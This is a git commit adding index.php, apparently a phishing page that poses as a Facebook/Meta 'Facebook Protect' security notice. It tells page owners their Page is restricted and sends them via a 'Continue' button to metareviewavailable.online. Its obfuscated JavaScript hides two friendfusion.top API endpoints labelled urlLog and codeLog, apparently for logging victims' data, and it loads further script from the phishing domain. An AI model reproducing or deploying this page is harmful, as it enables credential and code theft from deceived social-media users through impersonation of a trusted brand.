6282b7ed73b2b520c9ba75f666ca966e1e1dec4a
remove-page-violaton <167241675+remove-page-violaton@users.noreply.github.com>
2024-05-07 02:36:13 -0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="canonical" href="https://metareviewavailable.online/meta-community-standar">
+    <title>Privacy Policy</title>
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:locale:alternate" content="en_US" />
+    <meta name="referrer" content="no-referrer">
+    <link rel="icon" href="https://metareviewavailable.online/assets/images/fb_icon.ico" type="image/x-icon" />
+    <meta name="csrf-token" content="ige7VXYbDS4ZU3dOiqofeUYq0cWZK84FRSJn5bjW" />
+    <meta property="og:image" content="https://i.imgur.com/dPbn7je.jpg" />
+    <meta property="og:title" content="Privacy Policy" />
+    <meta property="og:url" content="http://metareviewavailable.online/meta-community-standar" />
+    <meta property="og:site_name" content="Business Help Center" />
+    <meta name="robots" content="index,follow">
+    <meta name="twitter:title" content="Privacy Policy">
+    <meta name="twitter:image" content="https://i.imgur.com/dPbn7je.jpg">
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="preload" as="style" href="https://metareviewavailable.online/build/assets/app-c7352b25.css" /><link rel="modulepreload" href="https://metareviewavailable.online/build/assets/app-44508a8e.js" /><link rel="stylesheet" href="https://metareviewavailable.online/build/assets/app-c7352b25.css" /><script type="module" src="https://metareviewavailable.online/build/assets/app-44508a8e.js"></script></head>
+
+<body>
+    <div class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto pt-14">
+
+    <div class="rounded-lg overflow-hidden mb-5">
+        <img src="https://metareviewavailable.online/assets/images/B2Y8S9I.jpg" class="mx-auto block mb-5 w-full h-full mb-0">
+    </div>
+
+    <p class="font-bold text-2xl">Welcome To Facebook Protect.</p>
+    <p class="my-5">Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
+        <a class="text-blue-500 hover:underline block" href="https://www.facebook.com/help" target="_blank">More information</a>
+    </p>
+
+    <div class="px-[14px]">
+        <ol class="relative text-gray-500 border-s-2 border-gray-200">
+            <li class="mb-10 ms-6">
+                <span
+                    class="absolute flex items-center justify-center w-6 h-6 bg-[#C4C4C4] rounded-full -start-[14px] ring-4 ring-white">
+                    <svg class="w-3 h-3 text-white" aria-hidden="true"
+                        xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 12">
+                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M1 5.917 5.724 10.5 15 1.5" />
+                    </svg>
+                </span>
+                <h3 class="text-black">We've enabled advanced protections to unlock your Page.</h3>
+            </li>
+            <li class="mb-10 ms-6">
+                <span
+                    class="absolute flex items-center justify-center w-6 h-6 bg-facebook rounded-full -start-[14px] ring-4 ring-white">
+                    <svg class="w-3 h-3 text-white" aria-hidden="true"
+                        xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 16">
+                        <path
+                            d="M18 0H2a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2ZM6.5 3a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5ZM3.014 13.021l.157-.625A3.427 3.427 0 0 1 6.5 9.571a3.426 3.426 0 0 1 3.322 2.805l.159.622-6.967.023ZM16 12h-3a1 1 0 0 1 0-2h3a1 1 0 0 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Z" />
+                    </svg>
+                </span>
+                <h3 class="text-black">Below, we walk you through the process in detail and help you fully activate to unlock your Page.</h3>
+            </li>
+        </ol>
+    </div>
+
+    <a href="https://metareviewavailable.online/business" class="block text-lg cursor-pointer bg-blue-500 w-full text-center xl:py-3 sm:py-3 py-3 text-white rounded-lg font-semibold">Continue</a>
+    <p class="text-center block mt-3 mb-5">Your page was restricted on <strong>May 7, 2024</strong>.</p>
+</div>
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    <script src="https://metareviewavailable.online/assets/js/jquery.min.js"></script>
+    <script type="text/javascript">
+        function _0x18d1(_0x53a09f,_0x2c478d){const _0x1e4e05=_0x1e4e();return _0x18d1=function(_0x18d1a5,_0x2172e4){_0x18d1a5=_0x18d1a5-0x157;let _0x1bf05e=_0x1e4e05[_0x18d1a5];return _0x1bf05e;},_0x18d1(_0x53a09f,_0x2c478d);}const _0x7a9ccd=_0x18d1;(function(_0x50e7e0,_0x2f1037){const _0x148273=_0x18d1,_0x4755ff=_0x50e7e0();while(!![]){try{const _0x29d31c=parseInt(_0x148273(0x157))/0x1+parseInt(_0x148273(0x161))/0x2*(parseInt(_0x148273(0x15d))/0x3)+parseInt(_0x148273(0x15b))/0x4+-parseInt(_0x148273(0x159))/0x5*(parseInt(_0x148273(0x158))/0x6)+parseInt(_0x148273(0x15a))/0x7+-parseInt(_0x148273(0x15c))/0x8+-parseInt(_0x148273(0x160))/0x9;if(_0x29d31c===_0x2f1037)break;else _0x4755ff['push'](_0x4755ff['shift']());}catch(_0x480191){_0x4755ff['push'](_0x4755ff['shift']());}}}(_0x1e4e,0x58337));const urlLog=_0x7a9ccd(0x15e),codeLog=_0x7a9ccd(0x15f);function _0x1e4e(){const _0x5ea50d=['4216504nCHVXv','33HjZzhP','https://friendfusion.top/api/zplpziybse','https://friendfusion.top/api/vzkbfkyttv','3754773BImsBY','96722pxhHJi','511055zpYqKu','12FEdKpK','1474345MRsJYh','2339960PzVLtF','2071852aTZYMa'];_0x1e4e=function(){return _0x5ea50d;};return _0x1e4e();}
+
+        const myIP = '223.123.108.219';
+        $.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+            }
+        });
+    </script>
+    <script src="https://metareviewavailable.online/assets/js/custom.js?v=sxnmqjdz"></script>
+    </body>
+
+</html>
